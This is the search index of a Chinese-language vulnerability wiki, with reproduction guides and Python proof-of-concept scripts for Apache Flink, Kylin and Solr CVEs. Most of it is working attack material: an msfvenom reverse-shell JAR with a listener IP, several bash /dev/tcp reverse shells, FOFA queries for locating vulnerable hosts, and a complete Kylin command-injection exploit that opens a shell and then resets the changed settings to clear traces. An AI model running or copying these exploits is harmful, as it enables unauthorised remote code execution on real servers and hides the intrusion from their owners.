{"./":{"url":"./","title":"关于文库","keywords":"","body":"PeiQI WiKi文库🐑 关于文库 如今漏洞的各种复现文章已经填满了互联网，但是每次去尝试漏洞复现时，总会纠结于环境搭建，POC和漏洞原理上。 由于这些因素，通常都需要翻阅很多很多的文章才能理解这个漏洞，于是，便萌生了把环境搭建，POC，漏洞原理全部集合在一个文库的想法，PeiQI WiKi文库便由此而来👻 关于使用 文库使用的是Gitbook，因为风格比较清新，简洁。于是便选择了它来搭建文库。 目前Wiki文库是开源的，每一个人都可以下载随时翻阅🐬 Github链接 码云链接 [!NOTE] POC文件都存放于漏洞分类后的目录中 [!NOTE] 网站目录上方支持正则搜索关键字快速查看 [!NOTE] 边框可以调整，字体大小和背景也支持更换 如何本地使用 [!NOTE] 1.Github 拉取代码 git clone https://gitee.com/yelisenyu/wiki.git git clone https://github.com/PeiQi0/wiki.git 2.下载 gitbook apt install npm npm install gitbook-cli -g 3.打开Wiki的目录下执行 gitbook serve 4.访问 http://localhost:4000 即可 最后 目前文库由我一人维护中，因为文库个人风格原因暂不接受师傅们的投稿。不过师傅们可以提出文库改良的意见给我。 [!NOTE] 别忘了Github下载完给个小星星⭐ PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-04 23:28:20 "},"PeiQi_Wiki/middleware_wiki/":{"url":"PeiQi_Wiki/middleware_wiki/","title":"中间件漏洞","keywords":"","body":"中间件漏洞整理🦔 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 14:36:20 "},"PeiQi_Wiki/middleware_wiki/Apache/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/","title":"Apache","keywords":"","body":"Apache 漏洞整理👻 Apache Flink Apache Flink Apache Kylin Apache kylin 未授权配置泄露 CVE-2020-13937 Apache Kylin 命令注入漏洞 CVE-2020-1956 Apache Solr Apache Solr 远程执行漏洞 CVE-2019-0193 Apache Solr Velocity模板远程执行 CVE-2019-17558 Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629 Apache Solr XXE 漏洞 CVE-2017-12629 Apache Solr JMX服务 RCE CVE-2019-12409 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-06 15:17:03 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-01 00:16:41 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/Apache=1.9.1远程代码执行.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Flink/Apache=1.9.1远程代码执行.html","title":"Apache Flink  <= 1.9.1(最新版本) 远程代码执行 ","keywords":"","body":"Apache Flink 漏洞描述 近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞. 影响范围 Apache Flink FOFA FOFA 语句 app=\"Apache-Flink\" && country=\"CN\" 国内还是很多使用 Apache Flink 的，大概有1000的数量左右 漏洞复现 随便打开一个使用 Apache Flink 的网站，打开后页面为这样子 点击查看文件上传页面 打开MSF 生成一个 jar 木马 msfvenom -p java/meterpreter/reverse_tcp LHOST=39.99.135.123 LPORT=4444 -f jar > test.jar 点击 Add 上传 jar 文件 监听端口 msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run 点击下 submit 反弹回来一个root 权限shell 漏洞检测POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] 可能存在 Apache Flink >> \\033[0m\")) POC_1(target_url) 修复方法 关闭文件上传调试模块 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 17:55:25 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache-kylin 未授权配置泄露 CVE-2020-13937 Apache Kylin 命令注入漏洞 CVE-2020-1956 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-06 15:17:20 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylin的未授权配置泄露.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylin的未授权配置泄露.html","title":"Apache Kylin的未授权配置泄露","keywords":"","body":"Apache Kylin的未授权配置泄露 CVE-2020-13937 FOFA app=\"APACHE-kylin\" 受影响的版本： Apache Kylin 有一个restful api会在没有认可认证的情况下暴露配置信息。 Kylin 2.x.x Kylin Kylin 4.0.0-alpha 漏洞利用 根据漏洞情报 漏洞利用POC为http://xxx.xxx.xxx.xxx/kylin/api/admin/config 漏洞检测POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] 存在Apache Kylin的未授权配置泄露\\n[o] 响应为:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 参考 CVE-2020-13937|Apache Kylin的未授权配置泄露漏洞，腾讯安全全面支持检测 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 18:26:58 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html","title":"Apache Kylin 命令注入漏洞 CVE-2020-1956","keywords":"","body":"Apache Kylin 命令注入漏洞 CVE-2020-1956 漏洞描述 2020年5月22日，CNVD 通报了 Apache Kylin 存在命令注入漏洞 CVE-2020-1956，地址在 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 。 Apache Kylin 是美国 Apache 软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供 Hadoop/Spark 之上的 SQL 查询接口及多维分析（OLAP**）等功能。 影响版本 [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 环境搭建 这里使用 docker 来搭建需要的环境 Kylin官方文档 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] 如果服务器内存较小，可不选择 -m 8G 参数 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 漏洞分析 查看这个漏洞修复的补丁 查看地址 这里可以看到此漏洞有关的参数有三个，分别是 srcCfgUri、dstCfgUri、projectName，相关的函数为 migrateCube 官方文档中对 migrateCube 的描述 POST /kylin/api/cubes/{cube}/{project}/migrate 下载 Apache Kylin 3.0.1 的源代码进行代码审计,出现漏洞函数的文件为以下路径 apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java 找到migrateCube函数 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorize里面定义了路由权限，ADMIN权限、ADMINISTRATION权限和MANAGEMENT权限可以访问该service。 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") 在1087行判断是否开启了MigrateCube设置，如果没有开启则会报错 跟进 isAllowAutoMigrateCube() 这个函数 可以看到这里默认的配置kylin.tool.auto-migrate-cube.enabled 就是Flase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } 在没有开启配置kylin.tool.auto-migrate-cube.enabled为true的情况下，调用MigrateCube则会出现报错 通过Apache Kylin的SYSTEM模块开启kylin.tool.auto-migrate-cube.enabled为True 设置后再去请求则不会出现刚刚的报错，而是出现Source configuration should not be empty 跟进出现报错语句的代码块 String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); 这里进行了对kylin.tool.auto-migrate-cube.src-config和kylin.tool.auto-migrate-cube.dest-config的配置进行了检测 ,如果为空则会出现刚刚的报错 跟进 getAutoMigrateCubeSrcConfig()和getAutoMigrateCubeDestConfig()函数 public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } 发现这两个配置默认为空，因为配置允许自定义，所以srcCfgUri和dstCfgUri两个变量均是可控的 继续向下走，发现一处命令拼接 String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } 进入到execute函数 private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } 由此可以得出我们可以通过这两个可控的参数，执行任意我们需要的命令，例如反弹一个shell，设置的配置为 [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell 再去发送POST请求 /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate 成功反弹一个shell 漏洞利用POC [!NOTE] POC利用前提是拥有账号密码，默认账号密码是 admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(格式为User:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] 账号密码出现错误 \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] 成功登录，获得JSESSIONID：\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"],Authorization except: print(\"\\033[31m[x] 漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, cookie, IP, PORT, Authorization): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\",\"kylin.tool.auto-migrate-cube.src-config\",\"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"true\",\"echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo\".format(IP, PORT), \"shell\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\"+cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将\" + key[i] +\"设置为\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] 设置\" + key[i] +\"为\" + value[i] +\"失败\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) def POC_3(target_url, cookie): print(\"\\033[35m[o] 正在反弹shell......\\033[0m\") vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.post(url=vuln_url, headers=headers) POC_4(target_url, cookie) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) def POC_4(target_url, cookie): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\", \"kylin.tool.auto-migrate-cube.src-config\", \"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"flase\", \"echo;echo;echo\", \"None\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将\" + key[i] +\"设置为\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] 设置\" + key[i] +\"为\" + value[i] +\"失败\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) print(\"\\033[35m[o] 成功清理痕迹\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie,Authorization = POC_1(target_url) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_2(target_url, cookie, IP, PORT, Authorization) POC_3(target_url, cookie) 参考文章 Apache Kylin 命令注入漏洞 CVE-2020-1956 POC 分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 00:12:46 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE 远程执行漏洞 CVE-2019-0193 Apache Solr Velocity模板远程执行 CVE-2019-17558 Apache Solr 远程命令执行漏洞 CVE-2017-12629 Apache Solr XXE 漏洞 CVE-2017-12629 Apache Solr JMX服务 RCE CVE-2019-12409 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-05 22:50:31 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html","title":"Apache Solr 远程执行漏洞 CVE-2019-0193","keywords":"","body":"Apache Solr 远程执行漏洞 CVE-2019-0193 漏洞描述 2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 点击刚刚创建的test进入调试 将下面的POC代码填入 Debug-Mode 中 注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入 [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell 点击EXecute执行代码 成功反弹shell 漏洞利用POC [!NOTE] POC不支持反弹shell，如需反弹shell，请按如上步骤反弹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] 目标Url,Dataimport模块开启\\033[0m\") else: print(\"\\033[31m[x] 目标Url,Dataimport模块未开启\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\", message) except: print(\"\\033[31m[x] 代码执行失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) 参考文章 apache solr远程代码执行漏洞(cve-2019-0193) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 14:18:01 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html","title":"Apache Solr Velocity模板远程执行 CVE-2019-17558","keywords":"","body":"Apache Solr Velocity模板远程执行 CVE-2019-17558 漏洞描述 2019年10月末，GitHub代码中安全研究员S00pY发布一个Apache Solr Velocity模版注入远程命令执行的POC，发现网络上出现针对Apache Solr服务器的远程代码执行漏洞。该漏洞是由于Velocity模板存在注入所致（Velocity是一个基于Java的模板引擎，可让使用者通过模板语言引用Java中定义的对象）。攻击者在知道Solr服务器上Core名称后，先把params.resource.loader.enabled设置为true（就可加载指定资源），再进行远程执行命令。 影响版本 [!NOTE] Apache Solr 5.x 至 8.2.0 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 打开后获取 Core 信息 得知 test 这个 Core 存在 访问 http://xxx.xxx.xxx.xxx:8983/solr/test/config 正常 访问Core的config配置信息时，通过POST请求把params.resource.loader.enabled设置为 True，再通过精心构造的get请求即可RCE，此时用户就可以加载指定资源，构造一个能执行命令的恶意请求 设置params.resource.loader.enabled为True POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 命令执行 再使用POC造成命令执行 http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 反弹hell，因为部分命令会被过滤导致返回 Error 500 ，所以反弹shell需要用另外的反弹shell方法 POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POC需要Urlencoding进行编码才能绕过 POC ： %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): 